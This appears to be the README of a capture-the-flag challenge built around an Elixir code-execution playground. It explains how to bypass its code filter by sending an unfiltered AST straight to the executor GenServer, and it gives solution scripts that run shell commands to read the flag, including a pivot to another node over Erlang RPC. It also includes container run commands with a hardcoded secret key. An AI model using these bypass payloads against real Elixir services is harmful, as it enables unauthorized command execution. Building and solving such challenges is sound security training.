# Elixir web-ish challenge

## idea

Players are granted access to a system allowing for limited Elixir code execution on the server, with a filter disallowing many/most dangerous functions.

Filtering and executing code have been split into separate functionality, with the executor itself running as a server on a separate node from the website frontend.

Functions allowing for sending/receiving messages between processes are still allowed, however, and knowing the name of an executor, unfiltered code can be sent to the executor.

Taking advantage of this, an AST containing system command / file read operations / anything can be sent and executed on the executor node using a call to  `GenServer.call` (or raw `send`/`receive` pair)

When the application's run in distributed mode, however, the flag is _not_ located on the executor node, so we need to get back to the web node. Erlang's built-in RPC functionality can be used to do this.

## solutions

### code execution (local variant)

```
ast = Code.string_to_quoted """
{output, status} = System.cmd("cat", ["flag"])
output
"""

{{:ok, flag}, bindings, stderr} =  GenServer.call({:global, Playground.Executor}, {:eval, ast, []})

IO.puts flag
```

### code execution (distributed)

```
ast = Code.string_to_quoted """
nodes = Node.list
web_node = hd nodes
{output, status} = :rpc.call(web_node, System, :cmd, ["cat", ["flag"]])
output
"""

{{:ok, flag}, bindings, stderr} =  GenServer.call({:global, Playground.Executor}, {:eval, ast, []})

IO.puts flag
```

## Running development/test (docker)

Build yourself the docker container

Pass a SECRET_KEY_BASE value to the container and expose port 4000

e.g:

`docker run -e SECRET_KEY_BASE=AkfxqjQOEfhbdVLhUkQcKNMijFYj/EXE3nRJu3nTh34uOWHQ/iv5PfKkTuGfnlsU -e PLAYGROUND_ROLE=all -e PHX_HOST=localhost -p4000:4000 chal`

## Running (full version)

(tested using `podman` instead of `docker`, tweaking may be required depending on context)

1. We need an isolated network for our two containers to communicate: 
  `podman network create playground`

2. Start the main, web container with the webserver exposed (on port 4000):
   `podman run -e SECRET_KEY_BASE=AkfxqjQOEfhbdVLhUkQcKNMijFYj/EXE3nRJu3nTh34uOWHQ/iv5PfKkTuGfnlsU -e PLAYGROUND_ROLE=web -e PHX_HOST=localhost -e RELEASE_DISTRIBUTION=name -e RELEASE_NODE=web@web.playground --network playground -p4000:4000 --network-alias web.playground d:latest`

3. Start the executor instance:
   `podman run -e SECRET_KEY_BASE=AkfxqjQOEfhbdVLhUkQcKNMijFYj/EXE3nRJu3nTh34uOWHQ/iv5PfKkTuGfnlsU -e PLAYGROUND_ROLE=executor -e PHX_HOST=localhost -e RELEASE_DISTRIBUTION=name -e RELEASE_NODE=executor@executor.playground --network-alias executor.playground --network playground d:latest`


Explanation of environment variables:

- `PLAYGROUND_ROLE` controls which type of system gets run (we need one each of web/executor - "all" can also be used to run both within one node, and is the default).
- `PHX_HOST` configures hostname checking for the website. change to the domain name players will be connecting to.
- `RELEASE_DISTRIBUTION` and `RELEASE_NODE` control each node's hostname to each other. `RELEASE_NODE` should end in an IP address or hostname reachable by the other node

## TODO list

- put flag only on `web` container
- tune difficulty

